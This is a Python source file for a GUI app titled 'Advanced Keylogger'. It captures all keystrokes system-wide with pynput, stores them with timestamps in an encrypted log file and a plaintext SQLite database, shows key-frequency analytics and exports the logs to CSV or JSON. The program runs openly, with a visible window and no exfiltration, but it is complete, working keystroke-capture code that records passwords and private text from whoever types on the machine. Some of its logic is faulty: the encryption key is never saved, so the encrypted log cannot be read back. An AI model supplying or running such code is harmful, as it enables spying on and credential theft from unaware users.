import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from pynput.keyboard import Listener
import threading
import sqlite3
import datetime
from cryptography.fernet import Fernet
import csv
import json
from collections import Counter

# Global variables
is_logging = False
is_paused = False
listener = None
log_file_path = "log.txt"
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)
db_path = "keylogs.db"
key_counter = Counter()

# Setup SQLite Database
def setup_database():
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            key TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

# Function to log keystrokes
def log_keystroke(key):
    global is_paused, key_counter
    if is_paused:
        return

    try:
        key_str = str(key).replace("'", "")
        key_counter[key_str] += 1  # Update the counter
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        log_entry = f"{timestamp} - {key_str}"

        # Encrypt the log entry
        encrypted_entry = cipher_suite.encrypt(log_entry.encode())

        # Save to file
        with open(log_file_path, "ab") as file:
            file.write(encrypted_entry + b"\n")

        # Save to database
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO logs (timestamp, key) VALUES (?, ?)", (timestamp, key_str))
        conn.commit()
        conn.close()

        # Update GUI in real time
        log_display.insert(tk.END, f"{log_entry}\n")
        log_display.see(tk.END)

        # Update analytics
        update_analytics()
    except Exception as e:
        print(f"Error: {e}")

# Update analytics in the GUI
def update_analytics():
    total_keys = sum(key_counter.values())
    most_frequent = key_counter.most_common(5)
    frequent_display = "\n".join([f"{k}: {v}" for k, v in most_frequent])

    analytics_display.delete(1.0, tk.END)
    analytics_display.insert(tk.END, f"Total Keys: {total_keys}\n\n")
    analytics_display.insert(tk.END, "Most Frequent Keys:\n")
    analytics_display.insert(tk.END, frequent_display)

# Start logging function
def start_logging():
    global is_logging, listener
    if not is_logging:
        is_logging = True
        is_paused = False
        status_label.config(text="Logging: ON", fg="green")
        listener = Listener(on_press=log_keystroke)
        threading.Thread(target=listener.start, daemon=True).start()

# Stop logging function
def stop_logging():
    global is_logging, listener
    if is_logging:
        is_logging = False
        status_label.config(text="Logging: OFF", fg="red")
        if listener:
            listener.stop()
            listener = None

# Pause/Resume logging
def toggle_pause():
    global is_paused
    if is_logging:
        is_paused = not is_paused
        pause_button.config(text="Resume Logging" if is_paused else "Pause Logging")

# Clear logs
def clear_logs():
    global key_counter
    key_counter.clear()
    log_display.delete(1.0, tk.END)
    analytics_display.delete(1.0, tk.END)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM logs")
    conn.commit()
    conn.close()
    messagebox.showinfo("Logs Cleared", "All logs have been cleared.")

# Export logs
def export_logs(format_type):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM logs")
    logs = cursor.fetchall()
    conn.close()

    if format_type == "csv":
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
        if file_path:
            with open(file_path, "w", newline="") as file:
                writer = csv.writer(file)
                writer.writerow(["ID", "Timestamp", "Key"])
                writer.writerows(logs)
            messagebox.showinfo("Export Complete", "Logs exported to CSV successfully.")
    elif format_type == "json":
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path, "w") as file:
                json.dump([{"ID": log[0], "Timestamp": log[1], "Key": log[2]} for log in logs], file, indent=4)
            messagebox.showinfo("Export Complete", "Logs exported to JSON successfully.")

# Export analytics
def export_analytics():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
    if file_path:
        total_keys = sum(key_counter.values())
        most_frequent = key_counter.most_common(5)
        with open(file_path, "w") as file:
            file.write(f"Total Keys: {total_keys}\n\n")
            file.write("Most Frequent Keys:\n")
            for k, v in most_frequent:
                file.write(f"{k}: {v}\n")
        messagebox.showinfo("Export Complete", "Analytics exported successfully.")

# Exit application
def exit_application():
    if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
        root.destroy()

# GUI setup
root = tk.Tk()
root.title("Advanced Keylogger")
root.geometry("800x600")

# Theme configuration
style = ttk.Style(root)
style.theme_use("clam")

# Tabs
notebook = ttk.Notebook(root)
main_frame = ttk.Frame(notebook)
analytics_frame = ttk.Frame(notebook)
notebook.add(main_frame, text="Logger")
notebook.add(analytics_frame, text="Analytics")
notebook.pack(expand=True, fill="both")

# Logger tab elements
status_label = tk.Label(main_frame, text="Logging: OFF", fg="red", font=("Arial", 12))
log_display = tk.Text(main_frame, height=20, width=80, wrap="word")
log_display_scroll = tk.Scrollbar(main_frame, command=log_display.yview)
log_display.configure(yscrollcommand=log_display_scroll.set)

start_button = tk.Button(main_frame, text="Start Logging", command=start_logging, width=20, bg="lightgreen")
pause_button = tk.Button(main_frame, text="Pause Logging", command=toggle_pause, width=20, bg="yellow")
stop_button = tk.Button(main_frame, text="Stop Logging", command=stop_logging, width=20, bg="salmon")
export_csv_button = tk.Button(main_frame, text="Export to CSV", command=lambda: export_logs("csv"), width=20, bg="lightblue")
export_json_button = tk.Button(main_frame, text="Export to JSON", command=lambda: export_logs("json"), width=20, bg="lightgray")
clear_logs_button = tk.Button(main_frame, text="Clear Logs", command=clear_logs, width=20, bg="red")
exit_button = tk.Button(main_frame, text="Exit", command=exit_application, width=20, bg="orange")

# Analytics tab elements
analytics_display = tk.Text(analytics_frame, height=30, width=80, state="normal", wrap="word")
analytics_label = tk.Label(analytics_frame, text="Real-Time Analytics", font=("Arial", 14))
export_analytics_button = tk.Button(analytics_frame, text="Export Analytics", command=export_analytics, width=20, bg="lightblue")

# Layout for Logger tab
status_label.pack(pady=10)
log_display.pack(side="left", pady=10, padx=5)
log_display_scroll.pack(side="right", fill="y", pady=10)
start_button.pack(pady=5)
pause_button.pack(pady=5)
stop_button.pack(pady=5)
export_csv_button.pack(pady=5)
export_json_button.pack(pady=5)
clear_logs_button.pack(pady=5)
exit_button.pack(pady=5)

# Layout for Analytics tab
analytics_label.pack(pady=10)
analytics_display.pack(pady=10, padx=10)
export_analytics_button.pack(pady=5)


# Setup database
setup_database()

# Start the GUI loop
root.mainloop()